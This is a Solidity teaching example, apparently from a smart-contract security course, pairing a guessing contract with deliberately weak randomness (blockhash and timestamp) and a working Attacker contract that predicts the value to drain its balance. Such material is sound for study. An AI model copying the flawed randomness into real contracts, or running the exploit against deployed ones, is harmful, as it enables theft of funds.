// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;


uint256 constant FEE = 100 wei;

/**
    @dev This contract includes an example of a predictable "random" number generation.
    @custom:deployed-at ETHERSCAN URL
        You can read about weak pseudo-randomness at https://swcregistry.io/docs/SWC-120
	@custom:PracticeAt https://github.com/jcsec-security/learn-solidity-security
*/
contract Example4 {

    uint256 result;


    function guess(uint256 n) public payable returns (bool) {
        require(msg.value == FEE, "Fee not paid!");
        uint256 pot = address(this).balance;

        result = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (result == n) {
            (bool success, ) = payable(msg.sender).call{value: pot}("");
            require(success, "Low level call failed");
        } else {
            revert("Failed guess!");
        }

        return true;
    }

}


/*****************************************************************************************************/
/******************************************* Attacker ************************************************/
/*****************************************************************************************************/


contract Attacker {

    uint256 result;
    Example4 victim;


    constructor (address target) {
        victim = Example4(target);
    }


    function exploit() external {      
        result = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        victim.guess{value: FEE}(result);
    }

}